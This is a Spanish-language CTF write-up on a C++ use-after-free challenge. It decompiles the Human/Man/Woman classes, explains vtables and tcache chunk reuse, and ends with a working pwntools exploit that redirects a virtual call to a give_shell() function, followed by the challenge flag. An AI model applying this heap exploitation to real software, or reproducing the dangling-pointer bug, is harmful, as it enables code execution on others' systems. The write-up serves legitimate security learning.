# uaf

<img width="136" height="172" alt="uaf" src="https://github.com/user-attachments/assets/e1dd2acf-4578-4c76-b042-18e183a6195f" />

## Introduccion

```
checksec ./uaf
[*] '/home/kalcast/uaf'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**Recomiendo que tenga un conocimiento basico de C++, POO, como funciona el heap, malloc y libc.**

Lo primero que notamos es que las funciones tienen nombres raros como "_ZNSaIcED1Ev@plt" o "_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1E". Esto es producto de un *mangler*, una parte del compilador que genera nombres unicos.

Podemos observar que algunas contienen "basic_ostream", "basic_istream".

Esto es caracteristico de C++, son los operadores  de flujo "<<" y ">>".

<img width="789" height="133" alt="2025-07-31-171404_789x133_scrot" src="https://github.com/user-attachments/assets/a808625e-a571-4e20-aecf-3e90eb568d7c" />

<img width="788" height="85" alt="2025-07-31-171507_788x85_scrot" src="https://github.com/user-attachments/assets/88b96a2c-27cb-45c1-93e1-424255f71bba" />

Herramientas como Ghidra son capaces de desenredar estas convenciones decompiladores como GCC y MSVC.

En Ghidra se ven las clases "Human", "Man", "Woman". "Man" y "Woman" parecen ser clases derivadas de "Human".

<img width="1364" height="712" alt="2025-07-31-172028_1364x712_scrot" src="https://github.com/user-attachments/assets/4c39d0ff-2366-46a6-9290-ddd9fdd0c5b9" />

Curiosamente "Human" tiene dos metodos:
- introduce()
- give_shell()

introduce() es claramente un metodo virtual:
```C

/* Human::introduce() */

void __thiscall Human::introduce(Human *this)

{
  ostream *poVar1;
  
  poVar1 = std::operator<<((ostream *)std::cout,"My name is ") ;
  poVar1 = std::operator<<(poVar1,(string *)(this + 0x10));
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"I am ");
  poVar1 = (ostream *)std::ostream::operator<<(poVar1,*(int * )(this + 8));
  poVar1 = std::operator<<(poVar1," years old");
  std::ostream::operator<<(poVar1,std::endl<>);
  return;
}
```

"Man" y "Woman" agregan una frase:
```C
/* Man::introduce() */

void __thiscall Man::introduce(Man *this)

{
  ostream *this_00;
  
  Human::introduce((Human *)this);
  this_00 = std::operator<<((ostream *)std::cout,"I am a nice g uy!");
  std::ostream::operator<<(this_00,std::endl<>);
  return;
}
```

```C
/* Man::introduce() */

void __thiscall Man::introduce(Man *this)

{
  ostream *this_00;
  
  Human::introduce((Human *)this);
  this_00 = std::operator<<((ostream *)std::cout,"I am a nice g uy!");
  std::ostream::operator<<(this_00,std::endl<>);
  return;
}
```

Podemos ver esto interactuando con el binario:
```
└─$ ./uaf
1. use
2. after
3. free
1
My name is Jack
I am 25 years old
I am a nice guy!
My name is Jill
I am 21 years old
I am a cute girl!
1. use
2. after
3. free
```

Su otro metodo es mas interesante. Esta no cambia en las clases derivadas:
```C

/* Human::give_shell() */

void Human::give_shell(void)

{
  __gid_t __egid;
  __gid_t __rgid;
  
  __egid = getegid();
  __rgid = getegid();
  setregid(__rgid,__egid);
  system("/bin/sh");
  return;
}
```

## Virtual tables

Ambos metodos son **virtuales**. Esto significa que tienen entradas en una estructura llamada **vtable**. Cada clase tiene su propia vtable con sus funciones virtuales y los llaman mediante vtable_base_address + offset.

Si ponemos un breakpoint en *main+318 observamos como es que se llama a `introduce()` para "Man" y "Woman":

<img width="568" height="131" alt="2025-07-31-180951_568x131_scrot" src="https://github.com/user-attachments/assets/a988a9e3-e4d3-428a-831c-60ef477e11b3" />

<img width="1309" height="651" alt="2025-07-31-181045_1309x651_scrot" src="https://github.com/user-attachments/assets/7db810bc-ffca-437e-93b1-188eb6fac700" />

<img width="933" height="293" alt="2025-07-31-182325_933x293_scrot" src="https://github.com/user-attachments/assets/a5953ff2-9937-4156-bf35-2856160a063f" />

En resumen el proceso es este:
```
rax = 0x4182b0               (puntero a vtable de Man)
rax = *rax = 0x404d80        (vtable de Man + 0x10) (apunta a Human::give_shell()!)        
rax = rax + 8 = 0x404d88     (vtable de Man + 0x18) (apunta a Man::Introduce())           
rdx = *rax = 0x402b20        (direccion de Man::Introduce())
call rdx
```

Nuestro objetivo es lograr que rax + offset caiga en 0x404d80 y asi llamar a `Human::give_shell()`

## Use-After-Free

Como sabemos C++ almacena sus objetos en el heap. Y los chunks de las instancias de Man y Woman son contiguos.

En la opcion 2 (after) podemos escribir argv[1] bytes desde un descriptor de archivo para argv[2] hacia un buffer **creado con new**, o sea, en el heap:

<img width="641" height="504" alt="2025-07-31-184121_641x504_scrot" src="https://github.com/user-attachments/assets/2e7245d5-f932-47d9-b7ee-e4f05d0ac15c" />

<img width="1039" height="309" alt="2025-07-31-184244_1039x309_scrot" src="https://github.com/user-attachments/assets/a27aa8e3-b3ed-4317-9342-50e4c53de242" />

Revisando el codigo de main de nuevo en Ghidra vemos que no se hace NULL a los punteros:
```C
    if (Man_Object != (Man *)0x0) {
      Human::~Human((Human *)Man_Object);
      operator.delete(ManPTR,0x30);
    }
    WomanPTR = Woman_Object;
    if (Woman_Object != (Woman *)0x0) {
      Human::~Human((Human *)Woman_Object);
      operator.delete(WomanPTR,0x30);
    }
```

Cuando un chunk es liberado generalmente va primero a una de las `tcachebins`, y si se intenta reservar un nuevo chunk del mismo tamaño se reutiliza el ultimo en entrar a la tcachebin del tamaño correspondiente.

Podemos entonces corromper los chunks de Man y Woman.

La estrategia es sencilla:
- Usamos la opcion 3 ("free") para liberar los dos chunks Man y luego Woman, la tcachebin de 0x30 bytes luce algo asi:
   `Woman_Free_Chunk <- Man_Free_Chunk <- HEAD`
- Usamos la opcion 2 ("after") para crear chunks del mismo tamaño que los objetos (0x30 bytes). Tenemos que hacer esto dos veces porque en el primer alloc sobreescribimos Woman, y en el segundo, Man.
- Usamos la opcion 3 ("use") para invocar a `Human::give_shell()`.

## Exploit
``` py
from pwn import *
# Fake Man Vtable
# originally 0x4182b0 => 00404d80, which results in rdx = 00404d80 + 8 (Man::Introduce)
# If we do 0x4182b0 => 00404d78, it results in rdx = 00404d78 + 8 (Man::give_shell)
payload =  p64(0x404d78)
payload += p64(0x19)
payload += p64(0x4182d0)
payload += p64(0x4)
payload += p64(0x6b63614a)
payload += p64(0x0)

assert len(payload) == 0x30

# I found that using /dev/stdin instead of a regular file is more elegant
r = process(["./uaf","48","/dev/stdin"])

# Free
r.sendlineafter(b"3. free",b"3")

# Overwrite Woman instance
r.sendlineafter(b"3. free",b"2")
r.sendline(payload)

# Overwrite Man instance
r.sendlineafter(b"3. free",b"2")
r.sendline(payload)

# Shell
r.sendlineafter(b"3. free",b"1")
r.interactive()
```

`d3lici0us_fl4g_after_pwning`
